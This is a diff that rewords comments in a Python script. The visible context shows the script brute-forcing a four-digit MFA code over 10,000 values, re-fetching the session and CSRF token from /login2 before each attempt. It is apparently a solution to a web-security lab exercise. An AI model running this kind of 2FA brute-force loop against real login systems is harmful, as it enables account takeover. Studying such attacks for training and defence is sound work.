@@ -12,7 +12,7 @@
 #           and the csrf token
 #        3. Obtain the new session
 #        4. GET /login2 with the new session
-#        5. Extract csrf token from the body of /login2
+#        5. Extract the csrf token from the body of /login2
 #        6. POST the mfa-code with the new session and the new
 #           extracted csrf token
 #        7. Repeat the process with all possbile numbers
@@ -63,7 +63,7 @@ for (index, code) in enumerate(range(0, 10000)):
     # get session cookie
     get_login_session = get_login_res.cookies.get("session")  
         
-    # extract csrf token
+    # Extract the csrf token
     get_login_token = re.findall("csrf.+value=\"(.+)\"", get_login_res.text)[0]
     
     # set session cookie
@@ -110,7 +110,7 @@ for (index, code) in enumerate(range(0, 10000)):
             FAILED_CODES.append(code)
             continue
     
-        # extract csrf token
+        # Extract the csrf token
         get_login2_token = re.findall("csrf.+value=\"(.+)\"", get_login2_res.text)[0]  
         
         # set data to send via POST
